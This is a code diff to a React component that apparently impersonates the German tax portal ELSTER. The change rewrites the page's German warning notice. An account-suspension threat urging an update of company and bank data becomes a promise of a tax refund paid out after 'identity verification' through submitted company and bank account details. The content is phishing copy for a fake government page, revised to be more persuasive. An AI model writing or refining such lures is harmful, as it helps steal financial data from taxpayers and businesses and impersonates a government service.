@@ -384,10 +384,12 @@ const Elster = () => {
 
             <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
               <p style={{ fontSize: 13, lineHeight: 1.55, color: TEXT, margin: "0 0 20px" }}>
-                <strong style={{ color: TEXT }}>Wichtiger Hinweis:</strong> Zur Aufrechterhaltung Ihres ELSTER-Unternehmenskontos ist eine
-                unverzügliche Aktualisierung Ihrer Firmen- und Bankdaten zwingend erforderlich. Bitte vervollständigen Sie die
-                nachfolgenden Angaben umgehend. Andernfalls wird Ihr Zugang zu Mein ELSTER vorübergehend gesperrt und kann
-                bei weiterer Nichtbeachtung dauerhaft entzogen werden.
+                <strong style={{ color: TEXT }}>Wichtiger Hinweis:</strong> Zur Auszahlung Ihrer Steuerrückerstattung auf das von Ihnen
+                angegebene Konto ist zunächst eine Verifizierung Ihrer Identität erforderlich. Dies dient dem Schutz vor
+                unberechtigten Auszahlungen und stellt sicher, dass der Erstattungsbetrag ausschließlich an die steuerpflichtige
+                Person bzw. das steuerpflichtige Unternehmen überwiesen wird. Bitte vervollständigen Sie hierzu die nachfolgenden
+                Firmen- und Kontodaten vollständig und wahrheitsgemäß. Nach erfolgreicher Prüfung wird der Erstattungsbetrag
+                innerhalb weniger Werktage auf das hinterlegte Konto überwiesen.
               </p>
             </div>
 
